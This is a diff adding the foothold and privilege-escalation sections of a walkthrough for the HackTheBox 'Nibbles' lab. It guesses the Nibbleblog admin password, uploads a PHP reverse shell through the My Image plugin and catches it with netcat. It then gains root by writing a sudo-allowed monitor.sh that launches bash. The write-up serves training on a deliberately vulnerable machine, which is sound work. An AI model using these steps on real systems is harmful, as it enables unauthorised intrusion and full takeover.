@@ -143,4 +143,143 @@ I navigated to `/README` and found out the `Nibbleblog's version` (v4.0.3). So I
 
 ![nib-4](https://user-images.githubusercontent.com/87711310/211606780-df7ac1fe-837d-42fc-8cec-5c68521cfe74.png)
 
+## Gaining an Initial Foothold
 
+![nib-5](https://user-images.githubusercontent.com/87711310/211736965-4b81f53b-96d0-43c5-a98e-116bfb9b3d31.png)
+
+Several important pieces of information are mentioned in the page.
+- It’s a code execution vulnerability.
+- The vulnerability is in the `My image` plugin that allows the upload of `PHP` files. So it would allow us to upload a `PHP reverse shell`.
+- It’s an authenticated vulnerability which means that we need `admin` credentials before we exploit this vulnerability.
+
+
+After finding the exploit, my next step was to:
+- Navigate to the admin login page and figure out the `admin` credentials
+- Navigate to the `My Image` plugin page and upload a PHP reverse shell
+
+The admin page could be found here: 
+
+```
+http://10.10.10.75/nibbleblog/admin.php
+```
+
+As you can see, we need `admin` credentials to get past this login page. The first thing i try is common credentials (admin:admin, admin:nibbles, nibbles:nibbles, nibbles:admin). If this doesn't work, I look out for default credentials online that are specific to this technology.
+
+In this case, the common credentials thing worked. The credentials were `admin:nibbles` 
+
+Now, I navigated to `my image` plugin. Click on `Plugins -> My Image -> Configure`
+
+![nib-6](https://user-images.githubusercontent.com/87711310/211739404-53f609d3-b731-478a-a467-dbd96ce1164a.png)
+
+I, then, headed over to [Pentestmonkey's website](http://pentestmonkey.net/tools/web-shells/php-reverse-shell) to get the code for a `PHP reverse shell`. 
+
+Change the `IP address` and `port` used by your attack machine. Then save it in a file called `image.php` and upload it on the site.
+
+![nib-7](https://user-images.githubusercontent.com/87711310/211739818-e993b76b-3f8a-40bf-a070-9a7586b3f61f.png)
+
+I, then, started a listener on above chose port
+```
+nc -lvnp 4444
+```
+
+Then, I navigated to image I just uploaded to run the reverse shell
+```
+http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php
+```
+
+And, I got a low privileged shell
+
+```bash
+┌──(darshan㉿kali)-[~/Desktop]
+└─$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.7] from (UNKNOWN) [10.10.10.75] 55268
+Linux Nibbles 4.4.0-104-generic #127-Ubuntu SMP Mon Dec 11 12:16:42 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
+ 02:07:48 up 18:06,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+nibbler
+```
+
+I tried to upgrade to a better shell using `python3`:
+```python
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+```
+
+This gives us a partially interactive bash shell and through this i could get the `user` flag
+
+```
+$ pwd
+/
+$ cd ..
+$ cd home
+$ ls
+nibbler
+$ cd nibbler
+$ ls
+personal
+personal.zip
+user.txt
+$ cat user.txt
+[REDACTED]
+```
+
+
+## Privilege Escalation
+
+Now, we need to escalate privileges and to find out what privileges i had, I used the `sudo -l` commnad
+
+```
+nibbler@Nibbles:/$ sudo -l                                                                                                                                                   
+Matching Defaults entries for nibbler on Nibbles:                                                                                                           
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin                                       
+                                                                                                                                                            
+User nibbler may run the following commands on Nibbles:                                                                                                     
+    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh 
+```
+
+I could run the script `monitor.sh` in the above specified directory as a `root` without having to enter a `root` password.
+
+First, I tried to look at the contents of the script
+
+```
+$ cat home/nibbler/personal/stuff/monitor.sh  
+cat: home/nibbler/personal/stuff/monitor.sh: No such file or directory   
+```
+ It doesn't exist, so I gues I had to create one.
+ 
+ ```
+mkdir -p home/nibbler/personal/stuff
+cd /home/nibbler/personal/stuff
+vi monitor.sh
+```
+
+And in the `monitor.sh` script, I added the following code.
+```
+#!/bin/sh
+bash
+```
+
+Made it executable and ran the script.
+```
+chmod +x monitor.sh
+```
+
+```
+sudo ./monitor.sh
+```
+
+And we're root!!!
+
+```
+root@Nibbles:/home/nibbler/personal/stuff# whoami
+root
+```
+
+And we can grab the root flag
+```
+root@Nibbles:/home/nibbler/personal/stuff# cat /root/root.txt
+[REDACTED]
+```
